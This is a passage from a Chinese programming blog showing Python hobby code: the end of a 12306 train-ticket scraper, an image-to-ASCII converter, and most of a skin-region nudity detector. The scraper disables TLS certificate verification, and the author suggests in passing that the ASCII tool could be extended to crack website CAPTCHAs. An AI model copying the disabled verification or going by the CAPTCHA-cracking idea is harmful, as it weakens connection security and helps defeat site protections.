raw_train[<span class="string">'zy_num'</span>],</div><div class="line">                    raw_train[<span class="string">'ze_num'</span>],</div><div class="line">                    raw_train[<span class="string">'rw_num'</span>],</div><div class="line">                    raw_train[<span class="string">'yw_num'</span>],</div><div class="line">                    raw_train[<span class="string">'yz_num'</span>],</div><div class="line">                    raw_train[<span class="string">'wz_num'</span>],</div><div class="line">                ]</div><div class="line">                yield train</div><div class="line"></div><div class="line">    def pretty_print(self):</div><div class="line">        pt = PrettyTable()</div><div class="line">        pt._set_field_names(self.header)</div><div class="line">        <span class="keyword">for</span> train <span class="keyword">in</span> self.trains:</div><div class="line">            pt.add_row(train)</div><div class="line">        <span class="built_in">print</span>(pt)</div><div class="line"></div><div class="line"></div><div class="line">def cli():</div><div class="line">    <span class="string">""</span><span class="string">"Command-line interface"</span><span class="string">""</span></div><div class="line">    arguments = docopt(__doc__)</div><div class="line">    from_station = stations.get(arguments[<span class="string">'&lt;from&gt;'</span>])</div><div class="line">    to_station = stations.get(arguments[<span class="string">'&lt;to&gt;'</span>])</div><div class="line">    date = arguments[<span class="string">'&lt;date&gt;'</span>]</div><div class="line">    url = (<span class="string">'https://kyfw.12306.cn/otn/lcxxcx/query?'</span></div><div class="line">           <span class="string">'purpose_codes=ADULT&amp;queryDate=&#123;&#125;&amp;'</span></div><div class="line">           <span class="string">'from_station=&#123;&#125;&amp;to_station=&#123;&#125;'</span>).format(</div><div class="line">                date, from_station, to_station</div><div class="line">           )</div><div class="line">    options = <span class="string">''</span>.join([</div><div class="line">        key <span class="keyword">for</span> key, value <span class="keyword">in</span> arguments.items() <span class="keyword">if</span> value is True</div><div class="line">    ])</div><div class="line">    r = requests.get(url, verify=False)</div><div class="line">    available_trains = r.json()[<span class="string">'data'</span>][<span class="string">'datas'</span>]</div><div class="line">    TrainsCollection(available_trains, options).pretty_print()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    cli()</div></pre></td></tr></table></figure></p>
<p>思考：说到底，其实还是相当于一个爬虫。信息爬取呗。</p>
<h2 id="字符串图片转换器"><a href="#字符串图片转换器" class="headerlink" title="字符串图片转换器"></a>字符串图片转换器</h2><p>使用python的第三方库，把图片的每一个像素点，对应成相应的字符，然后输出成字符串图像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">from PIL import Image</div><div class="line">import argparse</div><div class="line"></div><div class="line"></div><div class="line">parser = argparse.ArgumentParser()</div><div class="line"></div><div class="line">parser.add_argument(<span class="string">'file'</span>)</div><div class="line">parser.add_argument(<span class="string">'-o'</span>, <span class="string">'--output'</span>)</div><div class="line">parser.add_argument(<span class="string">'--width'</span>, <span class="built_in">type</span> = int, default = 80)</div><div class="line">parser.add_argument(<span class="string">'--height'</span>, <span class="built_in">type</span> = int, default = 80)</div><div class="line"></div><div class="line"></div><div class="line">args = parser.parse_args()</div><div class="line"></div><div class="line">IMG = args.file</div><div class="line">WIDTH = args.width</div><div class="line">HEIGHT = args.height</div><div class="line">OUTPUT = args.output</div><div class="line"></div><div class="line">ascii_char = list(<span class="string">"<span class="variable">$@B</span>%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\"^`'. "</span>)</div><div class="line"></div><div class="line"></div><div class="line">def get_char(r,g,b,alpha = 256):</div><div class="line">    <span class="keyword">if</span> alpha == 0:</div><div class="line">        <span class="built_in">return</span> <span class="string">' '</span></div><div class="line">    length = len(ascii_char)</div><div class="line">    gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)</div><div class="line"></div><div class="line">    unit = (256.0 + 1)/length</div><div class="line">    <span class="built_in">return</span> ascii_char[int(gray/unit)]</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    im = Image.open(IMG)</div><div class="line">    im = im.resize((WIDTH,HEIGHT), Image.NEAREST)</div><div class="line"></div><div class="line">    txt = <span class="string">""</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(HEIGHT):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(WIDTH):</div><div class="line">            txt += get_char(*im.getpixel((j,i)))</div><div class="line">        txt += <span class="string">'\n'</span></div><div class="line"></div><div class="line">    <span class="built_in">print</span> txt</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> OUTPUT:</div><div class="line">        with open(OUTPUT,<span class="string">'w'</span>) as f:</div><div class="line">            f.write(txt)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        with open(<span class="string">"output.txt"</span>,<span class="string">'w'</span>) as f:</div><div class="line">            f.write(txt)</div></pre></td></tr></table></figure></p>
<p>思考：我们可以在改工具的基础上考虑怎么去自动的获取网站的验证码，对验证码进行破解。同时也可以用来2张图片的差异监测，场景的变换。</p>
<h2 id="不可描述图片检测器"><a href="#不可描述图片检测器" class="headerlink" title="不可描述图片检测器"></a>不可描述图片检测器</h2><p>什么是不可描述图片，老司机们都懂的！<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line">import sys</div><div class="line">import os</div><div class="line">import _io</div><div class="line">from collections import namedtuple</div><div class="line">from PIL import Image</div><div class="line"></div><div class="line">class Nude(object):</div><div class="line"></div><div class="line">    Skin = namedtuple(<span class="string">"Skin"</span>, <span class="string">"id skin region x y"</span>)</div><div class="line"></div><div class="line">    def __init__(self, path_or_image):</div><div class="line">        <span class="comment"># 若 path_or_image 为 Image.Image 类型的实例，直接赋值</span></div><div class="line">        <span class="keyword">if</span> isinstance(path_or_image, Image.Image):</div><div class="line">            self.image = path_or_image</div><div class="line">        <span class="comment"># 若 path_or_image 为 str 类型的实例，打开图片</span></div><div class="line">        <span class="keyword">elif</span> isinstance(path_or_image, str):</div><div class="line">            self.image = Image.open(path_or_image)</div><div class="line"></div><div class="line">        <span class="comment"># 获得图片所有颜色通道</span></div><div class="line">        bands = self.image.getbands()</div><div class="line">        <span class="comment"># 判断是否为单通道图片（也即灰度图），是则将灰度图转换为 RGB 图</span></div><div class="line">        <span class="keyword">if</span> len(bands) == 1:</div><div class="line">            <span class="comment"># 新建相同大小的 RGB 图像</span></div><div class="line">            new_img = Image.new(<span class="string">"RGB"</span>, self.image.size)</div><div class="line">            <span class="comment"># 拷贝灰度图 self.image 到 RGB图 new_img.paste （PIL 自动进行颜色通道转换）</span></div><div class="line">            new_img.paste(self.image)</div><div class="line">            f = self.image.filename</div><div class="line">            <span class="comment"># 替换 self.image</span></div><div class="line">            self.image = new_img</div><div class="line">            self.image.filename = f</div><div class="line"></div><div class="line">        <span class="comment"># 存储对应图像所有像素的全部 Skin 对象</span></div><div class="line">        self.skin_map = []</div><div class="line">        <span class="comment"># 检测到的皮肤区域，元素的索引即为皮肤区域号，元素都是包含一些 Skin 对象的列表</span></div><div class="line">        self.detected_regions = []</div><div class="line">        <span class="comment"># 元素都是包含一些 int 对象（区域号）的列表</span></div><div class="line">        <span class="comment"># 这些元素中的区域号代表的区域都是待合并的区域</span></div><div class="line">        self.merge_regions = []</div><div class="line">        <span class="comment"># 整合后的皮肤区域，元素的索引即为皮肤区域号，元素都是包含一些 Skin 对象的列表</span></div><div class="line">        self.skin_regions = []</div><div class="line">        <span class="comment"># 最近合并的两个皮肤区域的区域号，初始化为 -1</span></div><div class="line">        self.last_from, self.last_to = -1, -1</div><div class="line">        <span class="comment"># 色情图像判断结果</span></div><div class="line">        self.result = None</div><div class="line">        <span class="comment"># 处理得到的信息</span></div><div class="line">        self.message = None</div><div class="line">        <span class="comment"># 图像宽高</span></div><div class="line">        self.width, self.height = self.image.size</div><div class="line">        <span class="comment"># 图像总像素</span></div><div class="line">        self.total_pixels = self.width * self.height</div><div class="line"></div><div class="line">    def resize(self, maxwidth=1000, maxheight=1000):</div><div class="line">        <span class="string">""</span><span class="string">"</span></div><div class="line">        基于最大宽高按比例重设图片大小，</div><div class="line">        注意：这可能影响检测算法的结果</div><div class="line"></div><div class="line">        如果没有变化返回 0</div><div class="line">        原宽度大于 maxwidth 返回 1</div><div class="line">        原高度大于 maxheight 返回 2</div><div class="line">        原宽高大于 maxwidth, maxheight 返回 3</div><div class="line"></div><div class="line">        maxwidth - 图片最大宽度</div><div class="line">        maxheight - 图片最大高度</div><div class="line">        传递参数时都可以设置为 False 来忽略</div><div class="line">        "<span class="string">""</span></div><div class="line">        <span class="comment"># 存储返回值</span></div><div class="line">        ret = 0</div><div class="line">        <span class="keyword">if</span> maxwidth:</div><div class="line">            <span class="keyword">if</span> self.width &gt; maxwidth:</div><div class="line">                wpercent = (maxwidth / self.width)</div><div class="line">                hsize = int((self.height * wpercent))</div><div class="line">                fname = self.image.filename</div><div class="line">                <span class="comment"># Image.LANCZOS 是重采样滤波器，用于抗锯齿</span></div><div class="line">                self.image = self.image.resize((maxwidth, hsize), Image.LANCZOS)</div><div class="line">                self.image.filename = fname</div><div class="line">                self.width, self.height = self.image.size</div><div class="line">                self.total_pixels = self.width * self.height</div><div class="line">                ret += 1</div><div class="line">        <span class="keyword">if</span> maxheight:</div><div class="line">            <span class="keyword">if</span> self.height &gt; maxheight:</div><div class="line">                hpercent = (maxheight / <span class="built_in">float</span>(self.height))</div><div class="line">                wsize = int((<span class="built_in">float</span>(self.width) * <span class="built_in">float</span>(hpercent)))</div><div class="line">                fname = self.image.filename</div><div class="line">                self.image = self.image.resize((wsize, maxheight), Image.LANCZOS)</div><div class="line">                self.image.filename = fname</div><div class="line">                self.width, self.height = self.image.size</div><div class="line">                self.total_pixels = self.width * self.height</div><div class="line">                ret += 2</div><div class="line">        <span class="built_in">return</span> ret</div><div class="line"></div><div class="line">    <span class="comment"># 分析函数</span></div><div class="line">    def parse(self):</div><div class="line">        <span class="comment"># 如果已有结果，返回本对象</span></div><div class="line">        <span class="keyword">if</span> self.result is not None:</div><div class="line">            <span class="built_in">return</span> self</div><div class="line">        <span class="comment"># 获得图片所有像素数据</span></div><div class="line">        pixels = self.image.load()</div><div class="line">        <span class="comment"># 遍历每个像素</span></div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(self.height):</div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(self.width):</div><div class="line">                <span class="comment"># 得到像素的 RGB 三个通道的值</span></div><div class="line">                <span class="comment"># [x, y] 是 [(x,y)] 的简便写法</span></div><div class="line">                r = pixels[x, y][0]   <span class="comment"># red</span></div><div class="line">                g = pixels[x, y][1]   <span class="comment"># green</span></div><div class="line">                b = pixels[x, y][2]   <span class="comment"># blue</span></div><div class="line">                <span class="comment"># 判断当前像素是否为肤色像素</span></div><div class="line">                isSkin = True <span class="keyword">if</span> self._classify_skin(r, g, b) <span class="keyword">else</span> False</div><div class="line">                <span class="comment"># 给每个像素分配唯一 id 值（1, 2, 3...height*width）</span></div><div class="line">                <span class="comment"># 注意 x, y 的值从零开始</span></div><div class="line">                _id = x + y * self.width + 1</div><div class="line">                <span class="comment"># 为每个像素创建一个对应的 Skin 对象，并添加到 self.skin_map 中</span></div><div class="line">                self.skin_map.append(self.Skin(_id, isSkin, None, x, y))</div><div class="line">                <span class="comment"># 若当前像素不为肤色像素，跳过此次循环</span></div><div class="line">                <span class="keyword">if</span> not isSkin:</div><div class="line">                    <span class="built_in">continue</span></div><div class="line"></div><div class="line">                <span class="comment"># 设左上角为原点，相邻像素为符号 *，当前像素为符号 ^，那么相互位置关系通常如下图</span></div><div class="line">                <span class="comment"># ***</span></div><div class="line">                <span class="comment"># *^</span></div><div class="line"></div><div class="line">                <span class="comment"># 存有相邻像素索引的列表，存放顺序为由大到小，顺序改变有影响</span></div><div class="line">                <span class="comment"># 注意 _id 是从 1 开始的，对应的索引则是 _id-1</span></div><div class="line">                check_indexes = [_id - 2, <span class="comment"># 当前像素左方的像素</span></div><div class="line">                                 _id - self.width - 2,  <span class="comment"># 当前像素左上方的像素</span></div><div class="line">                                 _id - self.width - 1,  <span class="comment"># 当前像素的上方的像素</span></div><div class="line">                                 _id - self.width]  <span class="comment"># 当前像素右上方的像素</span></div><div class="line">                <span class="comment"># 用来记录相邻像素中肤色像素所在的区域号，初始化为 -1</span></div><div class="line">                region = -1</div><div class="line">                <span class="comment"># 遍历每一个相邻像素的索引</span></div><div class="line">                <span class="keyword">for</span> index <span class="keyword">in</span> check_indexes:</div><div class="line">                    <span class="comment"># 尝试索引相邻像素的 Skin 对象，没有则跳出循环</span></div><div class="line">                    try:</div><div class="line">                        self.skin_map[index]</div><div class="line">                    except IndexError:</div><div class="line">                        <span class="built_in">break</span></div><div class="line">                    <span class="comment"># 相邻像素若为肤色像素：</span></div><div class="line">                    <span class="keyword">if</span> self.skin_map[index].skin:</div><div class="line">                        <span class="comment"># 若相邻像素与当前像素的 region 均为有效值，且二者不同，且尚未添加相同的合并任务</span></div><div class="line">                        <span class="keyword">if</span> (self.skin_map[index].region != None and</div><div class="line">                                region != None and region != -1 and</div><div class="line">                                self.skin_map[index].region != region and</div><div class="line">                                self.last_from != region and</div><div class="line">                                self.last_to != self.skin_map[index].region) :</div><div class="line">                            <span class="comment"># 那么这添加这两个区域的合并任务</span></div><div class="line">                            self._add_merge(region, self.skin_map[index].region)</div><div class="line">                        <span class="comment"># 记录此相邻像素所在的区域号</span></div><div class="line">                        region = self.skin_map[index].region</div><div class="line">                <span class="comment"># 遍历完所有相邻像素后，若 region 仍等于 -1，说明所有相邻像素都不是肤色像素</span></div><div class="line">                <span class="keyword">if</span> region == -1:</div><div class="line">                    <span class="comment"># 更改属性为新的区域号，注意元祖是不可变类型，不能直接更改属性</span></div><div class="line">                    _skin = self.skin_map[_id - 1]._replace(region=len(self.detected_regions))</div><div class="line">                    self.skin_map[_id - 1] = _skin</div><div class="line">                    <span class="comment"># 将此肤色像素所在区域创建为新区域</span></div><div class="line">                    self.detected_regions.append([self.skin_map[_id - 1]])</div><div class="line">                <span class="comment"># region 不等于 -1 的同时不等于 None，说明有区域号为有效值的相邻肤色像素</span></div><div class="line">                <span class="keyword">elif</span> region != None:</div><div class="line">                    <span class="comment"># 将此像素的区域号更改为与相邻像素相同</span></div><div class="line">                    _skin = self.skin_map[_id - 1]._replace(region=region)</div><div class="line">                    self.skin_map[_id - 1] = _skin</div><div class="line">                    <span class="comment"># 向这个区域的像素列表中添加此像素</span></div><div class="line">                    self.detected_regions[region].append(self.skin_map[_id - 1])</div><div class="line">        <span class="comment"># 完成所有区域合并任务，合并整理后的区域存储到 self.skin_regions</span></div><div class="line">        self._merge(self.detected_regions, self.merge_regions)</div><div class="line">        <span class="comment"># 分析皮肤区域，得到判定结果</span></div><div class="line">        self._analyse_regions()</div><div class="line">        <span class="built_in">return</span> self</div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment"># self.merge_regions 的元素都是包含一些 int 对象（区域号）的列表</span></div><div class="line">    <span class="comment"># self.merge_regions 的元素中的区域号代表的区域都是待合并的区域</span></div><div class="line">    <span class="comment"># 这个方法便是将两个待合并的区域号添加到 self.merge_regions 中</span></div><div class="line">    def _add_merge(self, _from, _to):</div><div class="line">        <span class="comment"># 两个区域号赋值给类属性</span></div><div class="line">        self.last_from = _from</div><div class="line">        self.last_to = _to</div><div class="line"></div><div class="line">        <span class="comment"># 记录 self.merge_regions 的某个索引值，初始化为 -1</span></div><div class="line">        from_index = -1</div><div class="line">        <span class="comment"># 记录 self.merge_regions 的某个索引值，初始化为 -1</span></div><div class="line">        to_index = -1</div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment"># 遍历每个 self.merge_regions 的元素</span></div><div class="line">        <span class="keyword">for</span> index, region <span class="keyword">in</span> enumerate(self.merge_regions):</div><div class="line">            <span class="comment"># 遍历元素中的每个区域号</span></div><div class="line">            <span class="keyword">for</span> r_index <span class="keyword">in</span> region:</div><div class="line">                <span class="keyword">if</span> r_index == _from:</div><div class="line">                    from_index = index</div><div class="line">                <span class="keyword">if</span> r_index == _to:</div><div class="line">                    to_index = index</div><div class="line"></div><div class="line">        <span class="comment"># 若两个区域号都存在于 self.merge_regions 中</span></div><div class="line">        <span class="keyword">if</span> from_index != -1 and to_index != -1:</div><div class="line">            <span class="comment"># 如果这两个区域号分别存在于两个列表中</span></div><div class="line">            <span class="comment"># 那么合并这两个列表</span></div><div class="line">            <span class="keyword">if</span> from_index != to_index:</div><div class="line">                self.merge_regions[from_index].extend(self.merge_regions[to_index])</div><div class="line">                del(self.merge_regions[to_index])</div><div class="line">            <span class="built_in">return</span></div><div class="line"></div><div class="line">        <span class="comment"># 若两个区域号都不存在于 self.merge_regions 中</span></div><div class="line">        <span class="keyword">if</span> from_index == -1 and to_index == -1:</div><div class="line">            <span class="comment"># 创建新的区域号列表</span></div><div class="line">            self.merge_regions.append([_from, _to])</div><div class="line">            <span class="built_in">return</span></div><div class="line">        <span class="comment"># 若两个区域号中有一个存在于 self.merge_regions 中</span></div><div class="line">        <span class="keyword">if</span> from_index != -1 and to_index == -1:</div><div class="line">            <span class="comment"># 将不存在于 self.merge_regions 中的那个区域号</span></div><div class="line">            <span class="comment"># 添加到另一个区域号所在的列表</span></div><div class="line">            self.merge_regions[from_index].append(_to)</div><div class="line">            <span class="built_in">return</span></div><div class="line">        <span class="comment"># 若两个待合并的区域号中有一个存在于 self.merge_regions 中</span></div><div class="line">        <span class="keyword">if</span> from_index == -1 and to_index != -1:</div><div class="line">            <span class="comment"># 将不存在于 self.merge_regions 中的那个区域号</span></div><div class="line">            <span class="comment"># 添加到另一个区域号所在的列表</span></div><div class="line">            self.merge_regions[to_index].append(_from)</div><div class="line">            <span class="built_in">return</span></div><div class="line"></div><div class="line">    <span class="comment"># 合并该合并的皮肤区域</span></div><div class="line">    def _merge(self, detected_regions, merge_regions):</div><div class="line">        <span class="comment"># 新建列表 new_detected_regions</span></div><div class="line">        <span class="comment"># 其元素将是包含一些代表像素的 Skin 对象的列表</span></div><div class="line">        <span class="comment"># new_detected_regions 的元素即代表皮肤区域，元素索引为区域号</span></div><div class="line">        new_detected_regions = []</div><div class="line"></div><div class="line">        <span class="comment"># 将 merge_regions 中的元素中的区域号代表的所有区域合并</span></div><div class="line">        <span class="keyword">for</span> index, region <span class="keyword">in</span> enumerate(merge_regions):</div><div class="line">            try:</div><div class="line">                new_detected_regions[index]</div><div class="line">            except IndexError:</div><div class="line">                new_detected_regions.append([])</div><div class="line">            <span class="keyword">for</span> r_index <span class="keyword">in</span> region:</div><div class="line">                new_detected_regions[index].extend(detected_regions[r_index])</div><div class="line">                detected_regions[r_index] = []</div><div class="line"></div><div class="line">        <span class="comment"># 添加剩下的其余皮肤区域到 new_detected_regions</span></div><div class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> detected_regions:</div><div class="line">            <span class="keyword">if</span> len(region) &gt; 0:</div><div class="line">                new_detected_regions.append(region)</div><div class="line"></div><div class="line">        <span class="comment"># 清理 new_detected_regions</span></div><div class="line">        self._clear_regions(new_detected_regions)</div><div class="line"></div><div class="line">    <span class="comment"># 皮肤区域清理函数</span></div><div class="line">    <span class="comment"># 只保存像素数大于指定数量的皮肤区域</span></div><div class="line">    def _clear_regions(self, detected_regions):</div><div class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> detected_regions:</div><div class="line">            <span class="keyword">if</span> len(region) &gt; 30:</div><div class="line">                self.skin_regions.append(region)</div><div class="line"></div><div class="line">    <span class="comment"># 分析区域</span></div><div class="line">    def _analyse_regions(self):</div><div class="line">        <span class="comment"># 如果皮肤区域小于 3 个，不是色情</span></div><div class="line">        <span class="keyword">if</span> len(self.skin_regions) &lt; 3:</div><div class="line">            self.message = <span class="string">"Less than 3 skin regions (&#123;_skin_regions_size&#125;)"</span>.format(</div><div class="line">                _skin_regions_size=len(self.skin_regions))</div><div class="line">            self.result = False</div><div class="line">            <span class="built_in">return</span> self.result</div><div class="line"></div><div class="line">        <span class="comment"># 为皮肤区域排序</span></div><div class="line">        self.skin_regions = sorted(self.skin_regions, key=lambda s: len(s),</div><div class="line">                                   reverse=True)</div><div class="line"></div><div class="line">        <span class="comment"># 计算皮肤总像素数</span></div><div class="line">        total_skin = <span class="built_in">float</span>(sum([len(skin_region) <span class="keyword">for</span> skin_region <span class="keyword">in</span> self.skin_regions]))</div><div class="line"></div><div class="line">        <span class="comment"># 如果皮肤区域与整个图像的比值小于 15%，那么不是色情图片</span></div><div class="line">        <span class="keyword">if</span> total_skin / self.total_pixels * 100 &lt; 15:</div><div class="line">            self.message = <span class="string">"Total skin percentage lower than 15 (&#123;:.2f&#125;)"</span>.format(total_skin / self.total_pixels * 100)</div><div class="line">            self.result = False</div><div class="line">            <span class="built_in">return</span> self.result</div><div class="line"></div><div class="line">        <span class="comment"># 如果最大皮肤区域小于总皮肤面积的 45%，不是色情图片</span></div><div class="line">        <span class="keyword">if</span> len(self.skin_regions[0]) / total_skin * 100 &lt; 45:</div><div class="line">            self.message = <span class="string">"The biggest region contains less than 45 (&#123;:.2f&#125;)"</span>.format(len(self.skin_regions[0]) / total_skin * 100)</div><div class="line">            self.result = False</div><div class="line">            <span 